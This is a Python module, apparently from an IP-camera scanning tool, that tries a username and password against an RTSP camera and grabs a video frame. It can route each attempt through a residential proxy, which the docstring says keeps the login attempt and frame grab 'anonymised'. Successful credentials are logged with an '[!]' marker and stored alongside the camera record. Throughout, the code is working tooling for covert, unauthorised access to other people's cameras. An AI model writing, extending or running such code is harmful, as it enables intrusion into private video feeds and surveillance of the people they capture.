"""Confirm an RTSP camera answers by grabbing one frame.

The transport is a strategy: DirectTransport connects straight from the local
IP; ProxiedTransport relays the RTSP TCP connection through the residential exit
(see ProxyTunnel) and forces rtsp_transport=tcp, so the probe, the login attempt
and the frame grab are all anonymised. Each transport yields the URL OpenCV
should open, as a context manager, so probe() stays flat and branch-free.
"""

import logging
import os
import threading
import urllib.parse
from contextlib import contextmanager
from dataclasses import dataclass
from typing import Iterator, Protocol

import cv2
import numpy as np

from models.camera import Camera, CameraStatus
from scanners.proxy import TwoCaptchaProxy
from scanners.proxy_tunnel import ProxyTunnel

# Force RTSP over TCP so control and media share one connection the tunnel can
# carry; stimeout (microseconds) bounds a dead camera behind the proxy.
_TCP_CAPTURE_OPTIONS = "rtsp_transport;tcp|stimeout;8000000"


@dataclass(frozen=True)
class RtspTarget:
    """A single RTSP endpoint to try, with the credentials and URL template."""

    host: str
    port: int
    user: str
    password: str
    url_template: str

    @property
    def url(self) -> str:
        return self.url_template.format(self.user, self.password, self.host, self.port)


@dataclass(frozen=True)
class ProbeResult:
    """What a probe that answered produced: the camera and one frame.

    The frame used to travel in a `Camera` column as hex text; the schema keeps
    frames as files now (D17), so it travels as the decoded array instead.
    """

    camera: Camera
    frame: np.ndarray


def _rewrite_netloc(url: str, host: str, port: int) -> str:
    """Point an RTSP url at (host, port), keeping its userinfo, path and query."""
    parts = urllib.parse.urlsplit(url)
    userinfo = ""
    if parts.username is not None:
        userinfo = parts.username
        if parts.password is not None:
            userinfo += f":{parts.password}"
        userinfo += "@"
    netloc = f"{userinfo}{host}:{port}"
    return urllib.parse.urlunsplit(
        (parts.scheme, netloc, parts.path, parts.query, parts.fragment)
    )


_capture_options_lock = threading.Lock()
_capture_options_depth = 0
_capture_options_previous = None


@contextmanager
def _ffmpeg_tcp_transport() -> Iterator[None]:
    """Force OpenCV/FFmpeg to RTSP-over-TCP for the duration, then restore.

    The option is a process-global env var, so under a CheckTask thread pool a
    per-call set/restore would race: one probe's restore could clear it while
    another is opening its capture. A depth counter keeps it set while any probe
    is active and restores the prior value only when the last one leaves.
    """
    global _capture_options_depth, _capture_options_previous
    with _capture_options_lock:
        if _capture_options_depth == 0:
            _capture_options_previous = os.environ.get("OPENCV_FFMPEG_CAPTURE_OPTIONS")
            os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = _TCP_CAPTURE_OPTIONS
        _capture_options_depth += 1
    try:
        yield
    finally:
        with _capture_options_lock:
            _capture_options_depth -= 1
            if _capture_options_depth == 0:
                if _capture_options_previous is None:
                    os.environ.pop("OPENCV_FFMPEG_CAPTURE_OPTIONS", None)
                else:
                    os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = (
                        _capture_options_previous
                    )


@contextmanager
def _opened_capture(url: str) -> Iterator[cv2.VideoCapture]:
    capture = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
    try:
        yield capture
    finally:
        capture.release()


class Transport(Protocol):
    """Yields the URL OpenCV should open for a target, managing any tunnel."""

    def open(self, target: RtspTarget) -> "Iterator[str]": ...


class DirectTransport:
    """Connect straight to the camera from the local IP (no anonymisation)."""

    @contextmanager
    def open(self, target: RtspTarget) -> Iterator[str]:
        yield target.url


class ProxiedTransport:
    """Relay the RTSP TCP connection through the proxy exit."""

    def __init__(self, proxy: TwoCaptchaProxy):
        self._proxy = proxy

    @contextmanager
    def open(self, target: RtspTarget) -> Iterator[str]:
        with ProxyTunnel(self._proxy.url(), target.host, target.port) as (host, port):
            with _ffmpeg_tcp_transport():
                yield _rewrite_netloc(target.url, host, port)


class RtspProbe:
    """Opens an RTSP stream through a Transport and grabs one frame."""

    def __init__(self, transport: Transport = None, proxy: TwoCaptchaProxy = None):
        self._transport = transport or self._default_transport(proxy)

    def probe(self, target: RtspTarget) -> ProbeResult | None:
        with self._transport.open(target) as url:
            return self._grab(url, target)

    def _grab(self, url: str, target: RtspTarget) -> ProbeResult | None:
        logging.debug(url)
        with _opened_capture(url) as capture:
            ok, frame = capture.read()
        if not ok:
            logging.debug("No frame for %s", target.url)
            return None
        logging.info(
            "[!] %s, user: %s, password: %s", target.url, target.user, target.password
        )
        return ProbeResult(camera=self._to_camera(target), frame=frame)

    @staticmethod
    def _to_camera(target: RtspTarget) -> Camera:
        return Camera(
            ip=target.host,
            port=target.port,
            user=target.user,
            password=target.password,
            url=target.url,
            status=CameraStatus.stream_obtained,
        )

    @staticmethod
    def _default_transport(proxy: TwoCaptchaProxy) -> Transport:
        return ProxiedTransport(proxy) if proxy is not None else DirectTransport()
